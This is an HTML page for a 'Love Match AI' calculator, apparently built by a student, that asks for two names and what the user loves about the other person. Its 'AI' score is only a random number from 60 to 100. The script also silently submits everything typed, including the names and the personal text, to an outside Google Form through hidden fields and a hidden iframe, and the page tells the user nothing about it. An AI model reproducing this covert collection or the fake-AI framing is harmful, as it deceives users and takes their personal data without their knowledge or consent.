<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Match Calculator ❤️</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>

<body>
<div id="introPopup" class="introPopup">
    <div class="letterBox">

        <div class="letterTop">💌 Love Match Letter</div>

        <div id="letterText" class="letterText"></div>

        <button id="openLetterBtn" onclick="startLetter()">
            Open Letter ❤️
        </button>

        <button id="closeLetterBtn" class="closeBtn" onclick="closeLetter()">
            Start Matching 💕
        </button>

    </div>
</div>
    <div class="particles">
    <span style="left:5%;font-size:18px;animation-duration:12s;">❤</span>
    <span style="left:15%;font-size:24px;animation-duration:16s;">❤</span>
    <span style="left:25%;font-size:14px;animation-duration:11s;">❤</span>
    <span style="left:35%;font-size:20px;animation-duration:15s;">❤</span>
    <span style="left:45%;font-size:26px;animation-duration:13s;">❤</span>
    <span style="left:55%;font-size:16px;animation-duration:17s;">❤</span>
    <span style="left:65%;font-size:22px;animation-duration:12s;">❤</span>
    <span style="left:75%;font-size:28px;animation-duration:18s;">❤</span>
    <span style="left:85%;font-size:18px;animation-duration:14s;">❤</span>
    <span style="left:95%;font-size:24px;animation-duration:16s;">❤</span>
</div>

<div class="container">

    <div class="heart">❤️</div>
    <h1>Love Match AI</h1>

    <input type="text" id="name1" placeholder="Your Name">
    <input type="text" id="name2" placeholder="Their Name">
    <input type="text" id="loveText" placeholder="What do you love about them?">

    <div class="error" id="errorMsg"></div>

    <button onclick="calculateLove()">Calculate ❤️</button>

    <div class="result" id="result">
        <div class="percent" id="percent">0%</div>

        <div class="bar">
            <div class="fill" id="fill"></div>
        </div>

        <div class="message" id="message"></div>
    </div>

</div>

<!-- overlay -->
<div class="overlay" id="overlay">
    <div class="loaderCard">
        <div class="spinner"></div>
        <p>Calculating compatibility...</p>
    </div>
</div>

<!-- Google Form (DATA SAVER) -->
<form id="googleForm"
action="https://docs.google.com/forms/d/e/1FAIpQLSdpvaxjPEfTz-nKFGHoc8J3UhV2hWlXS1cQSAR_NH1e9TSzgg/formResponse"
method="POST"
target="hidden_iframe">

<input type="hidden" name="entry.1203440948" id="g1">
<input type="hidden" name="entry.632297335" id="g2">
<input type="hidden" name="entry.2029294024" id="g3">
</form>

<iframe name="hidden_iframe" style="display:none;"></iframe>

<!-- footer -->
<div class="footer">
    <p>&lt;/&gt; developed by Prottoy • a class 10 vibe coder</p>
</div>

<script>
function isValidName(name){

    name = name.trim();

    if(name.length < 3) return false;
    if(/[0-9]/.test(name)) return false;
    if(!/[aeiouAEIOU]/.test(name)) return false;
    if(!/^[a-zA-Z\s]+$/.test(name)) return false;

    let vowels = name.match(/[aeiouAEIOU]/g);
    let consonants = name.match(/[bcdfghjklmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ]/g);

    if(!vowels || !consonants) return false;
    if(consonants.length > vowels.length * 4) return false;

    return true;
}

function calculateLove(){

    let n1 = document.getElementById("name1").value.trim();
    let n2 = document.getElementById("name2").value.trim();
    let love = document.getElementById("loveText").value.trim();

    let error = document.getElementById("errorMsg");

    if(!n1 || !n2 || !love){
        error.innerText = "❌ Please fill all fields!";
        return;
    }

    if(!isValidName(n1) || !isValidName(n2)){
        error.innerText = "❌ Please enter real-looking names!";
        return;
    }

    error.innerText = "";

    document.getElementById("overlay").style.display = "flex";

    setTimeout(() => {

        let percent = Math.floor(Math.random() * 41 + 60);

        document.getElementById("overlay").style.display = "none";

        document.getElementById("result").style.display = "block";
        document.getElementById("percent").innerText = percent + "%";
        document.getElementById("fill").style.width = percent + "%";

        let msg = "";

        if(percent > 85) msg = "💖 Perfect match!";
        else if(percent > 70) msg = "💘 Strong connection!";
        else msg = "💗 Good vibes!";

        document.getElementById("message").innerText = msg;

        // 💾 SAVE TO GOOGLE FORM
        document.getElementById("g1").value = n1;
        document.getElementById("g2").value = n2;
        document.getElementById("g3").value = love;

        document.getElementById("googleForm").submit();

    }, 1500);
}
</script>

</body>
</html>
